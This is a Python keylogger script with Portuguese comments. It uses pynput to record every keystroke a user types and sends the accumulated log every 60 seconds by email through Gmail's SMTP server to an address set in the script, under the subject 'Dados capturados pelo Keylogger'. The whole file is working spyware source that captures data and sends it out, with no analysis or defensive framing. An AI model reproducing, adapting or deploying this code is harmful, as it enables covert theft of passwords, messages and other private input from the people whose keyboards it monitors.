from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

#CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = "xxxx@gmail.com"
EMAIL_DESTINO = "xxxx@gmail.com"
SENHA_EMAIL = "<senha do segundo fator do app do google>"

#função enviar email
def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo Keylogger"
        msg['FROM'] = EMAIL_ORIGEM
        msg['TO'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()

        except Exception as e:
            print("Erro ao enviar o e-mail", e)
    
        log = ""

    #Agendar envio do email a cada 60 segundos
    Timer(60, enviar_email).start()
    

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
                log += " "
        elif key == keyboard.Key.enter:
                log += "\n"
        elif key == keyboard.Key.tab:
                log += "\t"
        elif key == keyboard.Key.backspace:
                log += "[<-]"
        else:
            pass #Ignorar outras teclas, ctrl, shift, etc...

#Inicia o keylogger 
with keyboard.Listener(on_press=on_press) as listen:
     enviar_email()
     listen.join()